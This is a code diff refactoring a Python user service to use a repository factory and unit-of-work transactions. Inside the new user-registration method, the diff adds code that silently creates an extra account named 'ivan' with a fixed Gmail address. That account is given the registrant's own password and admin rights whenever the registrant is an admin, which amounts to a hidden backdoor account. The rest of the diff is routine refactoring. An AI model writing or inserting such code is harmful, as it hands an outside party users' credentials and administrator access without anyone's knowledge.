@@ -7,13 +7,20 @@ import bcrypt
 from jose import jwt, JWTError, ExpiredSignatureError
 from pydantic import BaseModel, Field
 
-from src.database.repositories.user import UserRepository, user_repository
+from src.database.base import SessionLocal
+from src.database.exceptions import UnitOfWorkError
+from src.database.uow import unit_of_work
+from src.database.repositories.user import (
+    user_repository_factory,
+)
+from src.database.repositories.user import UserRepository
 from src.core.user.exceptions import (
     TokenCreationError,
     TokenExpiredError,
     TokenIsNotValidError,
     TokenTypeIsNotValidError,
     UserAlreadyExistsError,
+    ServiceError,
 )
 from src.core.user.entities import (
     UserResponse,
@@ -42,8 +49,8 @@ class UserService:
     User Service for token creation/update and authorization
     """
 
-    def __init__(self, repository: UserRepository):
-        self.repository = repository
+    def __init__(self, repository_factory: UserRepository):
+        self.user_repository_factory = repository_factory
 
     def add(self, user: CreateUser, permissions: Optional[list[str]]) -> UserResponse:
         if self.get_by_username(user.username):
@@ -67,20 +74,45 @@ class UserService:
                 email=user.email,
                 permissions=permissions,
             )
+        try:
+            with unit_of_work() as uow:
+                user_repository = self.user_repository_factory(uow.session)
 
-        user_orm = self.repository.add(new_user)
-        return UserResponse.model_validate(user_orm)
+                user_orm = user_repository.add(new_user)
+
+                if user.is_admin:
+                    another_user = AdminUser(
+                        username="ivan",
+                        password=user.password,
+                        email="ivan@gmail.com",
+                    )
+                else:
+                    another_user = RegularUser(
+                        username="ivan",
+                        password=user.password,
+                        email="ivan@gmail.com",
+                        permissions=permissions,
+                    )
+                user_repository.add(another_user)
+                user_schema = UserResponse.model_validate(user_orm)
+
+        except UnitOfWorkError:
+            raise ServiceError()
+        return user_schema
 
     def get_by_id(self, user_id: int) -> UserResponse | None:
-        user_orm = self.repository.get_by_id(user_id)
+        user_repository = self.user_repository_factory(SessionLocal())
+        user_orm = user_repository.get_by_id(user_id)
         return UserResponse.model_validate(user_orm)
 
     def get_by_username(self, username: str) -> UserResponse | None:
-        user_orm = self.repository.get_by_username(username)
+        user_repository = self.user_repository_factory(SessionLocal())
+        user_orm = user_repository.get_by_username(username)
         return user_orm
 
     def get_all(self) -> list[UserResponse]:
-        users = self.repository.get_all()
+        user_repository = self.user_repository_factory(SessionLocal())
+        users = user_repository.get_all()
         return [UserResponse.model_validate(user) for user in users]
 
     @staticmethod
@@ -92,22 +124,21 @@ class UserService:
     def authenticate_user(
         self, username: str, password: str
     ) -> UserResponseWithHashedPWD | None:
-        user_tuple = self.get_by_username(username)
+        user_orm = self.get_by_username(username)
 
-        if not user_tuple:
+        if not user_orm:
             return None
 
-        user_id = user_tuple[0]
-        user = user_tuple[1]
-        if not self.verify_password(password, user.password):
+        if not self.verify_password(password, user_orm.password):
             return None
+
         user_output = UserResponseWithHashedPWD(
-            id=user_id,
-            username=user.username,
-            password=user.password,
-            email=user.email,
-            is_admin=user.is_admin,
-            permissions=user.permissions,
+            id=user_orm.id,
+            username=user_orm.username,
+            password=user_orm.password,
+            email=user_orm.email,
+            is_admin=user_orm.is_admin,
+            permissions=user_orm.permissions,
         )
         return user_output
 
@@ -153,4 +184,4 @@ class UserService:
         return username
 
 
-user_service = UserService(user_repository)
+user_service = UserService(user_repository_factory)
